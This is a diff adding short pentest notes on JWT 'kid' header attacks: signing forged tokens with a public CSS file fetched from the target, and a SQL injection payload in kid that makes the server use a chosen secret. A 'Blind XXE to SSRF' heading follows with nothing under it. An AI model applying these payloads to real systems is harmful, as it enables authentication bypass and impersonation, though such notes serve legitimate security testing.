@@ -1,6 +1,23 @@
 # Notes
 
 
+### JWT KID Value Exploitation
+*Sign with public file from server*
+```
+kid: public/css/file.css
+
+wget file.css from target
+
+manipulate token using jwt_tool and sign it with file.css
+```
+
+*SQL Injection*
+```
+kid: test' UNION SELECT 'key';--
+
+manipulate token using jwt_tool and sign it using the secret -> 'key'
+```
+
 
 ### Blind XXE to SSRF
 
